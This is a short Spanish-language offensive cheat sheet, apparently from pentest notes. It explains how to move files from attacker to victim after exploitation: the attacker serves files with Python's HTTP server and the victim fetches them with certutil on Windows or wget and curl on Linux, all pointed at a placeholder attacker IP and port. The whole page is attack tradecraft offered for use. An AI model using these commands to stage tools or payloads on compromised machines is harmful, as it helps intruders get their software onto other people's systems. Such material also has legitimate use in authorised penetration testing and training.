Permite transferir archivos entre atacante y víctima usando un servidor HTTP.

• Transferencia rápida de archivos  
• No requiere herramientas complejas  
• Muy útil en post-explotación

---

## Servidor HTTP (Atacante)

```
python3 -m http.server PORT
```

---

## Descargar en Windows

```
certutil -urlcache -f http://IP:PORT/fichero fichero
```

---

## Descargar en Linux

```
wget http://IP:PORT/fichero
```

---

## Alternativa (Linux - curl)

```
curl http://IP:PORT/fichero -o fichero
```
